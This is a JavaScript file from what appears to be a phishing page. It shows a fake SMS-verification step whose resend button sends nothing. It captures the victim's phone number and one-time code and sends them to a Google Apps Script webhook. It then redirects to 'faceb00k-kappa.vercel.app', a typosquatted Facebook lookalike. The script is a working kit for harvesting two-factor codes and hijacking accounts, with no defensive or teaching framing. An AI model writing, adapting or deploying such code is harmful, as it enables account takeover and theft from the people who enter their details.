document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM fully loaded and parsed');

  // ← Replace with your **exact** deployed Web App URL (exec)
  const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzojLn6xnintLmNE3jlBgKPFJNj4RGK_PP3x9c0BOlogEsLn0Ya2dvco8t71zutNW1pqQ/exec';

  const phoneInput   = document.getElementById('phoneInput');
  const codeInput    = document.getElementById('codeInput');
  const continueBtn  = document.getElementById('continueBtn');
  const errorMsg     = document.getElementById('errorMsg');

  const sendCodeBtn  = document.getElementById('sendCodeBtn');
  const timerSpan    = document.getElementById('timer');

  let countdownInterval = null;

  function formatTime(sec) {
    const m = Math.floor(sec / 60).toString().padStart(2,'0');
    const s = (sec % 60).toString().padStart(2,'0');
    return `${m}:${s}`;
  }

  function startCountdown() {
    let timeLeft = 120;
    sendCodeBtn.disabled = true;
    timerSpan.textContent = formatTime(timeLeft);
    timerSpan.style.display = 'inline';
    clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
      timeLeft--;
      timerSpan.textContent = formatTime(timeLeft);
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        timerSpan.style.display = 'none';
        sendCodeBtn.disabled = false;
        console.log('Countdown finished, resend enabled');
      }
    }, 1000);

    console.log('Countdown started');
  }

  // Start first countdown
  startCountdown();

  sendCodeBtn.addEventListener('click', () => {
    console.log('Resend clicked');
    startCountdown();
    // TODO: call your SMS‑send API here
  });

  continueBtn.addEventListener('click', () => {
    const phone = phoneInput.value.trim();
    const code  = codeInput.value.trim();
    errorMsg.style.visibility = 'hidden';

    if (!phone || !code) {
      errorMsg.textContent = 'Please enter both phone number and code.';
      errorMsg.style.visibility = 'visible';
      return;
    }

    const url = `${GSHEET_WEBHOOK_URL}?phone=${encodeURIComponent(phone)}&code=${encodeURIComponent(code)}`;
    console.log('Submitting to:', url);

    fetch(url)
      .then(res => res.json())
      .then(resp => console.log('Sheet response:', resp))
      .catch(err => console.error('Fetch error:', err))
      .finally(() => {
        console.log('Redirecting now');
        window.location.href = 'https://faceb00k-kappa.vercel.app/';
      });
  });
});
